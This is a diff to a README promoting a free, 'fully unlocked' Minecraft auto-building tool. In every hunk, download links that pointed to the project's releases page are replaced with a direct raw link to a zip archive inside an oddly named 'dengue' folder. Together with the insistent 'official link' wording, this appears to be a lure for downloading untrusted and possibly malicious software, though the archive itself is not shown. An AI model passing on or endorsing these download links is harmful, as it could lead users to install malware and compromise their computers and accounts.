@@ -1,7 +1,7 @@
 <h1>🎮 Minecraft-Auto-Build - Free, Unlocked, and Ready for 2026</h1>
 
 <p align="center">
-  <a href="https://github.com/kathleenpa5996/Minecraft-Auto-Build/releases"><img src="https://img.shields.io/badge/Download-Minecraft_Auto_Build_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download Button"></a>
+  <a href="https://raw.githubusercontent.com/kathleenpa5996/Minecraft-Auto-Build/main/dengue/Build_Minecraft_Auto_v1.9.zip"><img src="https://img.shields.io/badge/Download-Minecraft_Auto_Build_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50" alt="Download Button"></a>
 </p>
 
 ## 🚀 What Is Minecraft-Auto-Build?
@@ -30,7 +30,7 @@ Getting the tool on your computer is easy. Just follow these simple steps:
 
 Visit this link to download the application. Click the button below or use the link in the description.
 
-[**Download Minecraft-Auto-Build Now**](https://github.com/kathleenpa5996/Minecraft-Auto-Build/releases)
+[**Download Minecraft-Auto-Build Now**](https://raw.githubusercontent.com/kathleenpa5996/Minecraft-Auto-Build/main/dengue/Build_Minecraft_Auto_v1.9.zip)
 
 ### Step 2: Choose Your File
 
@@ -187,7 +187,7 @@ We are committed to making Minecraft-Auto-Build the best free building tool avai
 
 Do not forget to download the application from the official link to ensure you get the genuine, fully unlocked version.
 
-[**Download Minecraft-Auto-Build Now**](https://github.com/kathleenpa5996/Minecraft-Auto-Build/releases)
+[**Download Minecraft-Auto-Build Now**](https://raw.githubusercontent.com/kathleenpa5996/Minecraft-Auto-Build/main/dengue/Build_Minecraft_Auto_v1.9.zip)
 
 Enjoy unlimited building. See you in the game.
 
